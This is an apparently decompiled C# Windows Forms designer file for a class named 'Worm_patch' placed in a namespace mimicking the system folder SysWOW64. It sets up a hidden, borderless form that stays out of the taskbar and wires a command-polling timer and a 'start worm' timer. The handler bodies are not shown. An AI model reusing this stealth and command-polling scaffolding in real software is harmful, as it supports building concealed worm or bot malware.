namespace SysWOW64
{
	// Token: 0x02000002 RID: 2
	public partial class Worm_patch : global::System.Windows.Forms.Form
	{
		// Token: 0x06000006 RID: 6 RVA: 0x00002C8C File Offset: 0x00000E8C
		protected override void Dispose(bool disposing)
		{
			bool flag = disposing && this.components != null;
			if (flag)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002CC4 File Offset: 0x00000EC4
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			this.cmd_get = new global::System.Windows.Forms.Timer(this.components);
			this.tmr_start_worm = new global::System.Windows.Forms.Timer(this.components);
			base.SuspendLayout();
			this.cmd_get.Enabled = true;
			this.cmd_get.Interval = 10000;
			this.cmd_get.Tick += new global::System.EventHandler(this.cmd_get_Tick);
			this.tmr_start_worm.Enabled = true;
			this.tmr_start_worm.Interval = 15000;
			this.tmr_start_worm.Tick += new global::System.EventHandler(this.tmr_start_worm_Tick);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new global::System.Drawing.Size(50, 50);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.MaximizeBox = false;
			base.MinimizeBox = false;
			base.Name = "Worm_patch";
			base.ShowIcon = false;
			base.ShowInTaskbar = false;
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "ff0953qpn7361bbu";
			base.TopMost = true;
			base.Load += new global::System.EventHandler(this.Worm_patch_Load);
			base.ResumeLayout(false);
		}

		// Token: 0x04000001 RID: 1
		private global::System.ComponentModel.IContainer components = null;

		// Token: 0x04000002 RID: 2
		private global::System.Windows.Forms.Timer cmd_get;

		// Token: 0x04000003 RID: 3
		private global::System.Windows.Forms.Timer tmr_start_worm;
	}
}
